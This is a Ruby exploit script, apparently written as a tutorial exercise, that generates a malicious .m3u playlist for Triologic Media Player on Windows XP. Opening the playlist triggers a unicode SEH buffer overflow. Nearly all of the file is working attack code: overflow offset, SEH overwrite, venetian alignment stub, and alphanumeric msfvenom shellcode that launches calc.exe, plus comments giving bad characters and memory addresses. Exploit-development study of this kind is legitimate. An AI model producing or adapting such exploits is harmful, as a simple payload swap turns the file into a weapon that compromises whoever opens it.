# Brad Beacham 2018
#
#####################################################################################
# INFORMATION
# http://www.fuzzysecurity.com/tutorials/expDev/5.html
# This example differs in practice from the tutorial as I ended up having different addresses.
# Confirmed on Windows XP SP3
####    SEH record (nseh field) at 0x0012e270 overwritten with unicode pattern : 0x00410038 (offset 536)
####	0x004d0041 : pop ebx # pop ebp # ret 0x10 | (C:\Program Files\Triologic\Triologic Media Player\triomp8.exe)

# Badchars: "\x00\x0d\x0a\x3d\x20\x3f"

#####################################################################################

# Appends notifications to the start of text (ie. [*], [+], etc)
#####################################################################################
class String
	def error;        "\e[31m[!]\e[0m #{self}" end        # [!] Red
	def fail;         "\e[31m[-]\e[0m #{self}" end		  # [-] Red
	def success;      "\e[32m[+]\e[0m #{self}" end        # [+] Green
	def event;        "\e[34m[*]\e[0m #{self}" end        # [*] Blue
	def debug;        "\e[35m[%]\e[0m #{self}" end        # [%] Magenta
	def notification; "[-] #{self}" end                   # [-]
end

# Some simple input validation
input = ARGV
if input[0].nil?
	puts "USAGE: TriologicExploit.rb [filename]".error
	abort()
end
output = input[0] + ".m3u"

#####################################################################################
# Generate the exploit
buffer = 5000
offset = 536

nseh = "\x41\x71"
seh = "\x41\x4d"
junk = "\x90" * offset

# EBP starts at 0x0012B428
# Controlled stack is 0x0012BB58
# Difference is 730h, we can round up to 800 and use padding in the buffer to make the venetian alignment easier.
# Attempts to use !mona unicodealign -a 0012BB58 -b eax were too destructive to the resisters and essentially prevented the shellcode from executing.  I dont know assembly well enough to work around this.
align = 
"\x55" +			# push EBP
"\x71" +
"\x58" +			# pop EAX
"\x71" +
"\x05\x20\x11" +	# add eax,0x11002000
"\x71" +
"\x2d\x18\x11" +	# sub eax,0x11001800 (11001800 = 11002000 - 800)
"\x71" +			# EAX should now be 0x0012BC28
"\x50" +			# push EAX
"\x71" +
"\xC3" +			# RETN
"\x71"				# Additional venetian "NOP" to line up stack.

# Effective area for shellcode: between 0x0012BC28 and 0x0012DE2F (~8,711 bytes)
# Padding so we end up right on our shellcode.
# Start of shellcode area after alignment code: 	0x0012BB78
# Location of our shellcode:					-	0x0012BC28
#												=		176^10
# Offset 176 halved because we're adding in two bytes due to unicode conversion.
padding = "\x71" * 88

# msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f raw > calc.raw
# alpha2 eax --unicode --uppercase < calc.raw
buf =
"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIA" +
"QAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAP" +
"AZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB" +
"AB30APB944JBKLK8DBM0KPKPQPSYYUNQGPQTTK0" +
"PP04K0RLL4KQBMD4KSBMXLOX7OZMVNQKOVLOLQQ" +
"CLKRNLO07Q8OLMKQI7YRL2QBPWDKR2N0TK0JOL4" +
"KPLN1RXISOXKQXQPQ4K29O0KQZ34KOYMHZCNZ0I" +
"TKOD4KM1Z6P1KOVLGQHOLMM197NXK0T5L6M3SML" +
"8OKCMO4D5ITB84KB8NDM1YC1VTKLLPKTK0XMLM1" +
"Z3DKM4DKKQ8P590DO4MTQKQKQQB9QJPQKOIP1OQ" +
"OQJTKLRZKTMQMBJM1DMSUWBKPM0KPPPQXNQTK2O" +
"3WKOXU7KYPMMMZKZRH76TUWMEMKOJ5OLLFCLLJU" +
"0KKK02UM5GK0GN3RR2OQZKP0SKOJ5QSS1RL1SNN" +
"QUD8QUKPA"

evil = padding + buf
filler = "\x41" * (buffer - (offset + nseh.length + seh.length + align.length + evil.length))
exploit = junk + nseh + seh + align + evil + filler

#####################################################################################
# Send the exploit
begin
	puts "#######################################################".event	
	if File.exists?(output)
		puts "File [#{output}] exists!! Overwriting!".event
	end

rescue SystemExit, Interrupt
	puts "[Ctrl + C] caught! Exiting".error
	abort()

rescue
	puts "Unable to generate file [#{output}]".error
	abort()

else
	outputFile = File.open(output, "w")
	outputFile.puts exploit
	outputFile.close
    puts "File [#{output}] created.  Load the file and the Calculator will spawn on the target.".success
end
puts ""
